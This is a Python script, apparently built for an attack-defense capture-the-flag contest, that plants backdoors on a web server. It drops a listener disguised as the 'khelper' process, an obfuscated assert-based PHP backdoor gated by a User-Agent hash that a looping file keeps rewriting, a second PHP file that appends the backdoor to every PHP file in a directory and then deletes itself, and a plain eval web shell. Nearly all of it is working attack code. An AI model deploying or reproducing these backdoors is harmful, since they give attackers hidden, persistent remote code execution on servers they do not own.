import os
import subprocess
import time

web_home=r'/var/www/html'   #absolute path
web_config=web_home+os.sep+'config'
web_vul_path=web_home+os.sep+'admin'
web_plugin=web_home+os.sep+'plugins'
py_path=r'/tmp'

f1_name='khelper'
f1_path=py_path
f2_name='.host_config.php'
f2_path=web_config
f3_name='qpxm.php'
f3_path=web_plugin
f4_name='asset.php'
f4_path=web_vul_path

f1='''#!/usr/bin/python
import time
import socket
import os
import base64
import traceback
import logging

cmd=r'whoami'#cmd to get flag
port=55168
interval=30 #wake up interval(seconds)

logging.basicConfig(level=logging.DEBUG,format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',datefmt='%a, %d %b %Y %H:%M:%S')

def set_proc_name(newname):
    from ctypes import cdll, byref, create_string_buffer
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(newname)+1)
    buff.value = newname
    libc.prctl(15, byref(buff), 0, 0, 0)

def self_remove():
    filepath=os.path.abspath(sys.argv[0])
    #print filepath
    #os.remove(filepath)

if __name__=='__main__':
    #self_remove()
    set_proc_name('khelper')
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            address=('0.0.0.0',port)
            s.bind(address)
            s.listen(1)
            ss,ip=s.accept()
            # s.shutdown(socket.SHUT_RDWR)
            s.close()
            data=os.popen(cmd).read()
            logging.debug(data)
            ss.send(base64.b64encode(data))
            # ss.shutdown(socket.SHUT_RDWR)
            ss.close()
        except Exception as e:
            logging.debug(traceback.format_exc())
            #pass
        time.sleep(interval)
'''
f2='''
<?php
    set_time_limit(0);
    ignore_user_abort(true);
    $file='..'.DIRECTORY_SEPARATOR.'surf.php';
    $s="<?php if(md5(substr(\$_SERVER['HTTP_USER_AGENT'],-7))=='c9813cb1b00c16ed0d98d7c9bd57b850'){\$a=chr(96^5);\$b=chr(57^79);\$c=chr(15^110);\$d=chr(58^86);\$e='(\$_REQUEST[yzj])';@assert(\$a.\$b.\$c.\$d.\$e);}?>";
    while(true){
        file_put_contents($file,$s);
        system("chmod 777 ".$file.".php");
        usleep(100);
    }
?>'''
f3='''
<?php
$s="<?php if(md5(substr(\$_SERVER['HTTP_USER_AGENT'],-7))=='c9813cb1b00c16ed0d98d7c9bd57b850'){\$a=chr(96^5);\$b=chr(57^79);\$c=chr(15^110);\$d=chr(58^86);\$e='(\$_REQUEST[yzj])';@assert(\$a.\$b.\$c.\$d.\$e);}?>";
function walkfiles($path){
    foreach(scandir($path) as $afile)
    {
        if($afile=='.'||$afile=='..') continue;
        if(is_dir($path.DIRECTORY_SEPARATOR.$afile))
        {
            walkfiles($path.DIRECTORY_SEPARATOR.$afile);
        } else {
            $filename = $path.DIRECTORY_SEPARATOR.$afile;
            $file_ext  = pathinfo($filename,PATHINFO_EXTENSION);
            if( strtolower( $file_ext ) == "php"){
                try{
                    file_put_contents($filename,$GLOBALS['s'],FILE_APPEND);
                }catch(Exception $e){
                    //pass
                }
            }
        }
    }
} 
walkfiles(__DIR__.'/test/');
unlink(__FILE__);
?>'''

f4='''<?php eval($_REQUEST[yzj]);?>'''

open(f1_path+os.sep+f1_name,'w').write(f1)
subprocess.check_output("chmod a+x %s"%(f1_path+os.sep+f1_name,),shell=True)
open(f2_path+os.sep+f2_name,'w').write(f2)
open(f3_path+os.sep+f3_name,'w').write(f3)
open(f4_path+os.sep+f4_name,'w').write(f4)

subprocess.check_output("nohup %s %s &"%(f1_path+os.sep+f1_name,"--mode automatic"),shell=True)
# subprocess.check_output("rm %s"%(py_path+os.sep+f1_name,),shell=True)
#delete self
time.sleep(1)
# os.remove(__file__)
# print __file__